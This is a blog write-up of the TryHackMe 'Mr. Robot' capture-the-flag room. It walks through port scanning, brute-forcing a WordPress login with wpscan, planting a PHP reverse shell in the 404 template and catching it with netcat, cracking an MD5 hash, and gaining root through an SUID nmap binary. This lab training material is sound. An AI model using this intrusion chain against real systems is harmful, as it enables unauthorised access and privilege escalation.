---
title: Try Hack Me Mr. Robot Writeup
tags:
- tryhackme
- writeup
image: /images/mrrobot/info.jpeg
---

So let me just start out by saying that this was one of those box which were designed keeping the fun aspect in mind. The theme of the room is based on [mr. robot](https://en.wikipedia.org/wiki/Mr._Robot) . I have seen season 1 of Mr. robot which probably made it even more interesting. It was really fun looking around the whole webpage and see all those references to the series. If you have solved a few CTFs before then you will probably be able to know what the clues mean immediately. Knowing a bit about the series helped me skip some extra steps though. Enough talk! Lets root this thing **friend!**

<!--more-->

<img src="/images/mrrobot/info.jpeg" />

Kicking off with a nmap scan
{%highlight bash%}
nmap -sV -A -T4 10.10.123.255

Starting Nmap 7.60 ( https://nmap.org ) at 2020-09-03 17:27 IST
Nmap scan report for 10.10.123.255
Host is up (0.61s latency).
Not shown: 997 filtered ports
PORT    STATE  SERVICE VERSION
22/tcp  closed ssh
80/tcp  open http
443/tcp open https
{%endhighlight%}

So we have a web server on port 80. Browsing to it we are greeted with some *sick!* boot animation. 
<img src="/images/mrrobot/intro.gif" />

There are a few commands listed that we can run. I try all of them and see some clues in the video like [whoismrrobot.com](https://whoismrrobot.com). I stayed in this rabbit hole for a good amount of time before realizing that it is not of any use and that website is just a marketing thing to create hype around the series. Still pretty cool though!

I recommend using all the commands and see all the interesting stuff in there. I was a bit disappointed to see that all those commands were not significant to completing this room. Lets skip to the relevant stuff.

Realizing this and after having my fair share of enjoyment I get serious and start enumerating the webapp. One of the things I always do is check out robots.txt, which is even more important due to the theme of the room. And I stand corrected. 

<img src="/images/mrrobot/robots.txt.png" />

Browing to key-1-of-3.txt we get the first key. We also see a fsocity.dic file which we can download. Reading the contents of the file we some random words. If you have seen a wordlist before you will know that this is probably a clue that we have to use brute force somewhere.

{%highlight bash%}
cat fsocity.dic | more
true
false
wikia
from
the
now
Wikia
extensions
scss
window
http
var
page
Robot
Elliot
styles
and
document
mrrobot
com
ago
function
eps1
null
chat
user
Special
GlobalNavigation
{%endhighlight%}

Lets see how many words are in there with `wc` command.

{%highlight bash%}
wc fsocity.dic 
858160  858160 7245381 fsocity.dic
{%endhighlight%}

Holy crap! There are more than 800,000 words in there and bruteforcing with this list is going to take sooo.... long. Lets check for duplicates in there. Yep there were duplicates in there. Let me fix that... There were a lot! of duplicates in there.

{%highlight bash%}
sort -u fsocity.dic > unique
wc unique 
11451 11451 96747 unique
{%endhighlight%}

`sort -u` is used to sort the input and remove all the duplicates, and it's output is stored in the file named unique.

huh... That is only about 1.3% of what the original list was. Brute forcing with this is going to be a breeze!

Now we use dirbuster to bruteforce directories with common.txt list.

<img src="/images/mrrobot/dirb.png" />

We see a lot of "wp" s in there which means that we are dealing with a wordpress website. Surely there must be a wp-login.php page too. Fair enough we see a login page. This is probably where the list will come in handy. Now we have two options, either we brute-force both the username and the password or take some educated guesses. I try the first name that comes to my mind, i.e "Elliot" (*the protagonist*) and we have successfully slashed our work in half!

<img src="/images/mrrobot/wplogin1.png" />

All that is left is to brute force the password. I use the tool [wpscan](https://github.com/wpscanteam/wpscan) for this.

{%highlight bash%}
wpscan -U elliot -P unique --url http://10.10.123.255 --password-attack wp-login

_______________________________________________________________
         __          _______   _____
         \ \        / /  __ \ / ____|
          \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®
           \ \/  \/ / |  ___/ \___ \ / __|/ _` | '_ \
            \  /\  /  | |     ____) | (__| (_| | | | |
             \/  \/   |_|    |_____/ \___|\__,_|_| |_|

         WordPress Security Scanner by the WPScan Team
                         Version 3.8.6
       Sponsored by Automattic - https://automattic.com/
       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart
_______________________________________________________________

[+] URL: http://10.10.123.255/ [10.10.123.255]
[+] Started: Thu Sep  3 18:11:26 2020
--snip--
[!] Valid Combinations Found:
 | Username: elliot, Password: *********
 --snip--
{%endhighlight%}

And... we got the password. Now we can login to the admin pannel. 

<img src="/images/mrrobot/dashboard.png" width="1000"/>

we can see on the bottom-right corner that the version of of wordpress is 4.3.1

I am off to look for CVEs for this and come back with not so satisfying results. There wasn't any thing that jumped out or any proper exploits. So I just start looking around the dashboard in the hopes for some juicy stuff. I do find something.

<img src="/images/mrrobot/editor.png" />

I can edit the behaviour for all the pages in the website because I am an admin. So I replace the 404 error page with a php reverse shell. Start a netcat listener and browse to some non existant page in the website. 

{%highlight bash%}
nc -lvp 1234
Listening on [0.0.0.0] (family 0, port 1234)
Connection from 10.10.123.255 38851 received!
Linux linux 3.13.0-55-generic #94-Ubuntu SMP Thu Jun 18 00:27:10 UTC 2015 x86_64 x86_64 x86_64 GNU/Linux
 12:49:56 up 54 min,  0 users,  load average: 0.00, 0.01, 0.07
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=1(daemon) gid=1(daemon) groups=1(daemon)
/bin/sh: 0: can't access tty; job control turned off
$ whoami
daemon
{%endhighlight%}

And we have a shell. Before I start enumerating further, I first spawn a proper shell to get some more control. Most of the time there is python installed on a linux machine so this method always works.

{%highlight bash%}
$ python -c 'import pty; pty.spawn("/bin/bash")'
daemon@linux:/$
{%endhighlight%}

Now I start looking around. So the first place I look at is the /home directory because it always has some clue. I find some stuff in the directory of the user robot.

{%highlight bash%}
daemon@linux:/home/robot$ ls -alt
ls -alt
total 16
-rw-r--r-- 1 robot robot   39 Nov 13  2015 password.raw-md5
-r-------- 1 robot robot   33 Nov 13  2015 key-2-of-3.txt
drwxr-xr-x 2 root  root  4096 Nov 13  2015 .
drwxr-xr-x 3 root  root  4096 Nov 13  2015 ..
{%endhighlight%}

I am not able to read the 2nd key yet but I do find a hash for a password (probably for the user robot). I copy the md5 hash and head on over to [crackstation](https://crackstation.net) and the results come back rather quickly.

<img src="/images/mrrobot/crack.png" />

Reeaallll...secure password mr. robot

Now we can switch to user robot and get the second key. Next I try `sudo -l` to see my privileges but mr. robot is not allowed to use sudo. Bummer! I start looking for files that might seem interesting. So I try to list out the suid binaries.

{%highlight bash%}
robot@linux:~$ find / -perm -u=s -type f 2>/dev/null
find / -perm -u=s -type f 2>/dev/null
/bin/ping
/bin/umount
/bin/mount
/bin/ping6
/bin/su
/usr/bin/passwd
/usr/bin/newgrp
/usr/bin/chsh
/usr/bin/chfn
/usr/bin/gpasswd
/usr/bin/sudo
/usr/local/bin/nmap
/usr/lib/openssh/ssh-keysign
/usr/lib/eject/dmcrypt-get-device
{%endhighlight%}

We found the needle in the haystack. What is a nmap binary doing with the suid bit set? Getting us to root is what it is doing. 

I open up [GTFO bins](https://gtfobins.github.io/gtfobins/nmap/) for nmap and see several methods. Starting from the top was probably a good idea.

{%highlight bash%}
robot@linux:/usr/local/bin$ nmap --interactive
nmap --interactive

Starting nmap V. 3.81 ( http://www.insecure.org/nmap/ )
Welcome to Interactive Mode -- press h <enter> for help
nmap> !sh
!sh
\# whoami
whoami
root
\# cd /root
cd /root
\# ls
ls
firstboot_done	key-3-of-3.txt
{%endhighlight%}

Now we can get the final keys from the root directory. 

Cool room! 

